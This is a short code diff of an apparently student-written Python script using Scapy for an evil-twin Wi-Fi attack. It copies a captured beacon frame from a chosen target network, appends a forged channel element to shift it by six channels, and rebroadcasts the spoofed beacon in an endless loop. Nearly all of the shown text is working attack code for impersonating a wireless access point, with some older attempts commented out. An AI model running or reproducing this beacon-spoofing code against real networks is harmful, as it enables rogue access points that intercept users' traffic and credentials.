@@ -34,18 +34,21 @@ pktSource = pkt_full_list[evilTwinTarget -1]
 print("Actual Channel : ", pktSource[Dot11Beacon].network_stats().get("channel"))
 
 channel = pktSource[Dot11Beacon].network_stats().get("channel")
-print(ls(pktSource))
-newPkt = pktSource
+#print(ls(pktSource))
+#newPkt = pktSource.copy()
 #newPkt[Dot11Elt].payload.payload.info = chr((channel + 6) % 11)
-p = newPkt[Dot11Elt].payload
-while isinstance(p, Dot11Elt):
-    print("one")
-    if p.ID == 3:
-        p.info = chr(channel + 6)
-        break
-    p = p.payload
-
-print(ls(newPkt))
+#p = newPkt[Dot11Elt].payload
+#while isinstance(p, Dot11Elt):
+#    print("one")
+#    if p.ID == 3:
+#        p.info = )
+#        break
+#    p = p.payload
+#
+#print(ls(newPkt))
+#print(pktSource.show())
+#print(newPkt.show())
+newPkt = pktSource/Dot11Elt(ID="DSset", info=chr((channel + 6)%12))
 newChannel = newPkt[Dot11Beacon].network_stats().get("channel")
 print("New Channel : ", newChannel)
 sendp(newPkt, inter=0.1,loop=1, iface=interface)
